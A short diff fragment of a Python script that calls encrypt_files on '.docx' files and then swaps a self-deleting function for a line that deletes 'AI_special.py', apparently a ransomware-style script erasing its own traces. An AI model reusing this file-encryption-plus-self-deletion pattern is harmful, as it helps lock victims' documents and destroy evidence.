@@ -21,7 +21,10 @@ extension = '.docx'
 
 encrypt_files(path, key, extension)
 
-def delete_script():
-    os.remove(__file__)
+# def delete_script():
+#     os.remove(__file__)
+# delete_script()
 
-delete_script()
+
+filename = 'AI_special.py'
+os.remove(filename)
